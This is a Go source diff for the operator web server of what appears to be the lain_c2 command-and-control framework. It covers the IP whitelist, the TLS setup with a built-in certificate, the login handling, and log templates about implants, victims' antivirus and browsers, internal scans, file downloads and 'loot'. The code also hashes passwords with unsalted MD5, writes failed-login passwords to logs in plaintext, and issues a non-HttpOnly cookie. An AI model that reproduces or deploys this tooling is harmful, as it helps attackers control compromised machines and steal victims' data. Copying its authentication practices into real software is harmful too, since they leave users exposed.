+	Read_log_word()
+	asciiArt :=
+		`
+                                ..                    .
+                                x .d88"                @88>
+                                5888R                 %8P      u.    u.
+                                '888R         u        .     x@88k u@88c.
+                                888R      us888u.   .@88u  ^"8888""8888"
+                                888R   .@88 "8888" ''888E   8888  888R
+                                888R   9888  9888    888E    8888  888R
+                                888R   9888  9888    888E    8888  888R
+                                888R   9888  9888    888E    8888  888R
+                                .888B . 9888  9888    888&   "*88*" 8888"
+                                ^*888%  "888*""888"   R888"    ""   'Y"            .....  ...₵Ø₦₦Ɇ₵₮ ɆVɆⱤ₮Ⱨł₦₲...  ....
+                                "%     ^Y"   ^Y'     ""     
+    source code from: https://github.com/Mazzy-Stars/lain_c2
+    `
+	// 查询用户结构体
+	user_err := readJSONFile("user.json", &data_user)
+	if user_err != nil {
+		fmt.Println("Failed to read user data")
+	}
+
+	var configPath string
+	flag.StringVar(&configPath, "config", "server-config.json", "config file")
+	flag.Parse()
+
+	cfg, err := ensureConfig(configPath)
+	if err != nil {
+		fmt.Printf("load config failed: %v\n", err)
+		return
+	}
+
+	index_port := cfg.Port
+	certPath := cfg.CertPath
+	keyPath := cfg.KeyPath
+	useDefaultCert := cfg.DefaultCert
+	css_file := cfg.CSSFile
+	login_file := cfg.LoginFile
+	web_title := cfg.Title
+	ui_route := cfg.UIRoute
+	web_route := cfg.WebRoute
+	login_route := cfg.LoginRoute
+	web_js := cfg.JSRoute
+	web_css := cfg.CSSRoute
+	error_str = cfg.RespError
+
+	if _, err := os.Stat("./html"); os.IsNotExist(err) {
+		err := os.MkdirAll("./html", os.ModePerm)
+		if err != nil {
+			fmt.Println("[*] Unable to create directory ./html:", err)
+			return
+		}
+		fmt.Println("[*] directory ./html Created successfully")
+	}
+	http.Handle("/", staticWithCustom404("./html", cfg.NotFoundHeaders))
+	fmt.Println(asciiArt)
+
+	//历史聊天文件
+	Herr := LoadHistoryFiles()
+	if Herr != nil {
+		fmt.Println(Herr)
+	}
+
+	//登录
+	http.Handle("/"+login_route, withWhitelist(login(login_route, ui_route, web_title, login_file, cfg.NotFoundHeaders), cfg.NotFoundHeaders))
+
+	// --- 页面路由 ---
+	http.Handle("/"+ui_route, withWhitelist(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		mutex.RLock()
+		tempSessions := append([]string(nil), sessionSlice...)
+		mutex.RUnlock()
+
+		web_ui.Lain(error_str, web_title, web_js, web_css, tempSessions, cfg.NotFoundHeaders).ServeHTTP(w, r)
+	}), cfg.NotFoundHeaders))
+
+	// --- 有权限交互 ---
+	http.Handle("/"+web_route, withWhitelist(User_index(cfg.NotFoundHeaders), cfg.NotFoundHeaders))
+
+	// --- 调用 JS ---
+	http.Handle("/"+web_js, withWhitelist(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		mutex.RLock()
+		tempSessions := append([]string(nil), sessionSlice...)
+		mutex.RUnlock()
+
+		web_ui.Js(error_str, web_route, web_css, tempSessions, cfg.NotFoundHeaders).ServeHTTP(w, r)
+	}), cfg.NotFoundHeaders))
+
+	//调用css
+	http.Handle("/"+web_css, withWhitelist(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		mutex.RLock()
+		tempSessions := append([]string(nil), sessionSlice...)
+		mutex.RUnlock()
+
+		web_ui.Css(error_str, css_file, tempSessions, cfg.NotFoundHeaders).ServeHTTP(w, r)
+	}), cfg.NotFoundHeaders))
+
+	// 创建 HTTP Server
+	server := &http.Server{
+		Addr:         ":" + index_port,
+		Handler:      http.DefaultServeMux,
+		IdleTimeout:  0,
+		ReadTimeout:  30 * time.Second,
+		WriteTimeout: 0 * time.Second,
+	}
+
+	// 使用 HTTPS
+	var cert tls.Certificate
+	var certerr error
+	if useDefaultCert || (certPath == "" && keyPath == "") {
+		cert, certerr = tls.X509KeyPair([]byte(protocol.DefaultCert), []byte(protocol.DefaultKey))
+		if certerr != nil {
+			fmt.Printf("Failed to load default certificate: %v\n", certerr)
+			return
+		}
+	} else if certPath != "" && keyPath != "" {
+		cert, certerr = tls.LoadX509KeyPair(certPath, keyPath)
+		if certerr != nil {
+			fmt.Printf("[*] Failed to load custom certificate: %v\n", certerr)
+			return
+		}
+	} else {
+		flag.Usage()
+		return
+	}
+	// 自定义 TLS 配置
+	tlsConfig := &tls.Config{
+		MinVersion:         tls.VersionTLS12,
+		GetCertificate:     func(chi *tls.ClientHelloInfo) (*tls.Certificate, error) { return &cert, nil },
+		ClientAuth:         tls.NoClientCert,
+		InsecureSkipVerify: true,
+	}
+	server.TLSConfig = tlsConfig
+	fmt.Printf("[*] Start HTTPS server successful, access address https://localhost:%s/%s\n", index_port, login_route)
+	certerr = server.ListenAndServeTLS("", "")
+	if certerr != nil {
+		fmt.Printf("FAIL TO START HTTPS SERVER %v\n", certerr)
+	}
+}
+func ipAllowed(clientIP string, whitelist []string) bool {
+	client, err := netip.ParseAddr(clientIP)
+	if err != nil {
+		return false
+	}
+	client = client.Unmap()
+	for _, item := range whitelist {
+		item = strings.TrimSpace(item)
+		if item == "" {
+			continue
+		}
+		if prefix, err := netip.ParsePrefix(item); err == nil {
+			if prefix.Contains(client) {
+				return true
+			}
+			continue
+		}
+		allowed, err := netip.ParseAddr(item)
+		if err == nil && allowed.Unmap() == client {
+			return true
+		}
+	}
+
+	return false
+}
+func staticWithCustom404(root string, notFoundHeaders map[string]string) http.Handler {
+	fileServer := http.FileServer(http.Dir(root))
+
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		rec := httptest.NewRecorder()
+		fileServer.ServeHTTP(rec, r)
+
+		if rec.Code == http.StatusNotFound {
+			web_ui.WriteCustomError(w, http.StatusNotFound, error_str, notFoundHeaders)
+			return
+		}
+
+		for k, values := range rec.Header() {
+			for _, v := range values {
+				w.Header().Add(k, v)
+			}
+		}
+		w.WriteHeader(rec.Code)
+		_, _ = w.Write(rec.Body.Bytes())
+	})
+}
+
+func withWhitelist(next http.Handler, notFoundHeaders map[string]string) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		whitelistIPs, err := readWhitelist()
+		if err != nil {
+			http.Error(w, "internal config error", http.StatusInternalServerError)
+			return
+		}
+
+		clientIP := getClientIP(r)
+		allowed := ipAllowed(clientIP, whitelistIPs)
+
+		if !allowed {
+			web_ui.WriteCustomError(w, http.StatusNotFound, error_str, notFoundHeaders)
+			return
+		}
+
+		next.ServeHTTP(w, r)
+	})
+}
+
+func Read_log_word() {
+	filePath := "word.json"
+	// 默认内容（英文版）
+	defaultContent :=
+		`
+    {
+        "removed_agent": "Client [%s] has been removed",
+        "stop_server": "There are implants on the listening server, cannot stop service",
+        "removed_server": "Listening server [%s] has been removed",
+        "no_found_server": "Listening server %s not found",
+        "plugin_code": "Plugin code: %s, code: %s",
+        "agent_online": "==== New client online ==== | User: %v | UID: %v | Host: %v | OS: %v | Shell Version: %v | Executable: %v | Delay: %v sec | Jitter: %v sec | Server IP: %v | Internal IP: %v | Port: %v | Protocol: %v | Server Remark: %v | Current Path: %v | Key Hash (partial): %v ====",
+        "windows_agent_online": "==== New Windows client online | User: %v | UID: %v | Host: %v | OS: %v | Shell Version: %v | Executable: %v | Delay: %v sec | Jitter: %v sec | Server IP: %v | Internal IP: %v | Port: %v | Protocol: %v | Server Remark: %v | Current Path: %v | Key Hash (partial): %v | MAC: %v | CPU: %v | Memory: %v | System: %v | Arch: %v | Antivirus: %v | Browser: %v | Chat Software: %v ====",
+        "agent_key":"uid:%v agent key hash: %v",
+		"change_file_time": "host %v,%v Changed file time: %v",
+        "change_file_name": "host %v,%v Changed file name: %v",
+        "result": "Host: %s [%s] received bytes: [*%d...]",
+        "msg": "Send host %v message %v, %v",
+        "scan_msg": "%v Scan host %s",
+        "scan_result": "Host %s && %s received internal assets: [*%d...]",
+        "download": "Host: [%s] file downloaded successfully: [%s]",
+        "download_part": "Host: [%s] downloading file: [%s], bytes: %v, part: %v",
+        "request_file": "Received a file upload request",
+        "request_file_part": "Received file part: %s, size: %d bytes",
+        "request_file_part_": " ==== Received from user: %s, UID: %s, file: %s, part: %v, range: %d-%d",
+        "request_file_finish": " ==== Received from user: %s, UID: %s, file: %s, total size: %d bytes, file saved to: %s",
+        "tmp_file": "%v failed to create temp file: %v",
+        "write_tmp": "%v failed to write temp file: %v",
+        "read_tmp": "%v failed to read temp file: %v",
+        "upload_tmp": "%v file upload successfully (%d bytes): %v",
+        "Memory_clean": "Memory cleaned successfully!",
+        "request_host": "agent request: IP: %v, Host: %v, UID: %v",
+        "login_success": "User login successful, from %v, user: %v",
+        "login_fail": "User login failed, from %v, wrong username or password, user: %v, password: %v",
+        "http_server":"[*] Start HTTP server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
+        "https_server":"[*] Start HTTPS server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
+        "quic_server":"[*] Start HTTP3 server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
+        "http_err":"FAIL TO START HTTP SERVER: %v",
+        "https_err":"FAIL TO START HTTPS SERVER: %v",
+        "quic_err":"FAIL TO START HTTP3 SERVER: %v",
+        "cert_err":"[*]:%v Failed to parse provided cert or key: %v",
+        "provided_cert":"[*]:%v Using provided certificate and key",
+        "default_cert":"[*]:%v Failed to parse default cert or key: %v",
+        "chat_message":"[*] User: %s sent a chat: %s",
+        "chat_file":"User: %s upload chat file: %s",
+		"user_join":"[*] User Join: from %s joined %s",
+		"add_user":"[*] User: %s added user: %s md5 password: %s",
+		"del_loot":"[*] User: %s delete loot %s"
+    }
+    `
+	// 检查文件是否存在
+	if _, err := os.Stat(filePath); os.IsNotExist(err) {
+		// 文件不存在则写入默认内容
+		err := os.WriteFile(filePath, []byte(defaultContent), 0644)
+		if err != nil {
+			fmt.Println("Failed to create word.json:", err)
+			return
+		}
+	}
+	file, err := os.Open(filePath)
+	if err != nil {
+		fmt.Println("can not open word.json:", err)
+		return
+	}
+	defer file.Close()
+	decoder := json.NewDecoder(file)
+	err = decoder.Decode(&log_word)
+	if err != nil {
+		fmt.Println("can not read word.json:", err)
+		return
+	}
+}
+
+func readWhitelist() ([]string, error) {
+	filePath := "white.config"
+
+	if _, err := os.Stat(filePath); os.IsNotExist(err) {
+		WhiteMu.Lock()
+		if _, err := os.Stat(filePath); os.IsNotExist(err) {
+			if err := os.WriteFile(filePath, []byte("127.0.0.1\n::1\n"), 0644); err != nil {
+				WhiteMu.Unlock()
+				return nil, err
+			}
+		}
+		WhiteMu.Unlock()
+	}
+
+	WhiteMu.RLock()
+	defer WhiteMu.RUnlock()
+
+	file, err := os.Open(filePath)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	var whitelist []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" || strings.HasPrefix(line, "//") {
+			continue
+		}
+		whitelist = append(whitelist, line)
+	}
+	if err := scanner.Err(); err != nil {
+		return nil, err
+	}
+	return whitelist, nil
+}
+
+func writeWhitelist(whitelist []string) error {
+	cleaned := make([]string, 0, len(whitelist))
+	seen := make(map[string]struct{}, len(whitelist))
+
+	WhiteMu.Lock()
+	defer WhiteMu.Unlock()
+
+	for _, item := range whitelist {
+		line := strings.TrimSpace(item)
+		if line == "" {
+			continue
+		}
+		if _, ok := seen[line]; ok {
+			continue
+		}
+		seen[line] = struct{}{}
+		cleaned = append(cleaned, line)
+	}
+	content := strings.Join(cleaned, "\n")
+	if len(cleaned) > 0 {
+		content += "\n"
+	}
+	return os.WriteFile("white.config", []byte(content), 0644)
+}
+
+// 登录
+func login(login_route, ui_route, web_title, login_file string, notFoundHeaders map[string]string) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		if r.Method == http.MethodGet {
+			var html string
+			html_ := fmt.Sprintf(`
+			<!DOCTYPE html>
+				<html lang="en">
+				<head>
+					<meta charset="UTF-8">
+					<meta name="viewport" content="width=device-width, initial-scale=1.0">
+					<title>%s</title>
+					<style>
+						* {
+							box-sizing: border-box;
+						}
+
+						body {
+							margin: 0;
+							min-height: 100vh;
+							display: flex;
+							align-items: center;
+							justify-content: center;
+							padding: 20px;
+							background: linear-gradient(135deg, #eef5fb, #f8f5fb);
+							font-family: Arial, "Microsoft YaHei", sans-serif;
+						}
+
+						.form-in {
+							width: min(380px, calc(100vw - 40px));
+							max-width: none;
+							display: flex;
+							flex-direction: column;
+							align-items: stretch;
+							gap: 16px;
+							padding: 38px 34px;
+							background: #ffffff;
+							border: 1px solid #e4eaf1;
+							border-radius: 18px;
+							box-shadow: 0 18px 45px rgba(148, 163, 184, 0.18);
+						}
+
+						.form-in h1 {
+							margin: 0 0 12px;
+							text-align: center;
+							color: #334155;
+							font-size: 28px;
+							font-weight: 600;
+						}
+
+						.form-in input,
+						.form-in button {
+							display: block;
+							width: auto;
+							min-width: 0;
+							height: 48px;
+							align-self: stretch;
+						}
+
+						.form-in input {
+							padding: 0 15px;
+							border: 1px solid #d9e2ec;
+							border-radius: 10px;
+							outline: none;
+							background: #f8fafc;
+							color: #334155;
+							font-size: 14px;
+						}
+
+						.form-in input:focus {
+							border-color: #91b9df;
+							background: #ffffff;
+							box-shadow: 0 0 0 4px rgba(145, 185, 223, 0.18);
+						}
+
+						.form-in button {
+							margin-top: 4px;
+							border: none;
+							border-radius: 10px;
+							background: linear-gradient(135deg, #9fc4e5, #8eacd4);
+							color: #ffffff;
+							font-size: 15px;
+							font-weight: 600;
+							cursor: pointer;
+						}
+
+						.form-in button:hover {
+							background: #86add5;
+						}
+					</style>
+				</head>
+
+				<body>
+					<form
+						class="form-in"
+						action="/`+login_route+`"
+						method="post"
+						enctype="application/x-www-form-urlencoded"
+					>
+						<h1>Login</h1>
+						<input
+							type="text"
+							name="username"
+							id="username"
+							placeholder="Username"
+							required
+						>
+						<input
+							type="password"
+							name="password"
+							placeholder="Password"
+							required
+						>
+						<button type="submit">Login</button>
+					</form>
+				</body>
+				</html>
+			`,
+				web_title)
+			if login_file != "" {
+				fileContent, err := os.ReadFile(login_file)
+				if err != nil {
+					html = html_
+				} else {
+					html = string(fileContent)
+				}
+			} else {
+				html = html_
+			}
+			w.Header().Set("Content-Type", "text/html")
+			_, _ = io.WriteString(w, html)
+			return
+		}
+		if r.Method == http.MethodPost {
+			// 解析表单数据
+			err := r.ParseForm()
+			if err != nil {
+				web_ui.WriteCustomError(w, http.StatusNotFound, error_str, notFoundHeaders)
+				return
+			}
+			username := r.FormValue("username")
+			password := r.FormValue("password")
+			if strings.ContainsRune(username, '=') {
+			    web_ui.WriteCustomError(w, http.StatusNotFound, error_str, notFoundHeaders)
+			    return
+			}
+			userip := getClientIP(r)
+			// 对用户名进行MD5加密
+			usernameHashString := fmt.Sprintf("%x", md5.Sum([]byte(username)))
+			// 对密码进行MD5加密
+			passwordHashString := fmt.Sprintf("%x", md5.Sum([]byte(password)))
+
+			mutex.Lock()
+			defer mutex.Unlock()
+
+			user_err := readJSONFile("user.json", &data_user)
+			if user_err != nil {
+				web_ui.WriteCustomError(w, http.StatusNotFound, error_str, notFoundHeaders)
+				return
+			}
+			var validUser bool
+
+			for i := range data_user.Users {
+				user := &data_user.Users[i]
+				if usernameHashString == user.Username &&
+					passwordHashString == user.Password {
+					validUser = true
+					break
+				}
+			}
+			if validUser {
+				// 生成随机 Session 并绑定用户名
+				randomValue := generateRandomString(32)
+				cookie_value := randomValue + "=" + username
+				cookie := http.Cookie{
+					Name:     "cookie",
+					Value:    cookie_value,
+					Path:     "/",
+					Expires:  time.Now().Add(6 * 30 * 24 * time.Hour), // 半年
+					Secure:   true,
+					HttpOnly: false,
+					SameSite: http.SameSiteNoneMode,
+				}
+				found := false
+				for s := range sessionSlice {
+					session := &sessionSlice[s]
+					if *session == cookie_value {
+						found = true
+						break
+					}
+				}
+				// 如果不存在才添加
+				if !found {
+					sessionSlice = append(sessionSlice, cookie_value)
+				}
+				log_str := fmt.Sprintf(log_word["login_success"], userip, username)
+				logger.WriteLog(log_str)
+				http.SetCookie(w, &cookie)
+				http.Redirect(w, r, "/"+ui_route, http.StatusFound)
+				return
+			} else {
+				// 没有用户则
+				log_str := fmt.Sprintf(log_word["login_fail"], userip, username, password)
+				logger.WriteLog(log_str)
+				web_ui.WriteCustomError(w, http.StatusNotFound, error_str, notFoundHeaders)
+				return
+			}
+		} else {
+			web_ui.WriteCustomError(w, http.StatusNotFound, error_str, notFoundHeaders)
+			return
+		}
+	}
+}
+func generateRandomString(length int) string {
+	b := make([]byte, length)
+	if _, err := io.ReadFull(crand.Reader, b); err != nil {
+		log.Fatal(err)
+	}
+	return hex.EncodeToString(b)
+}
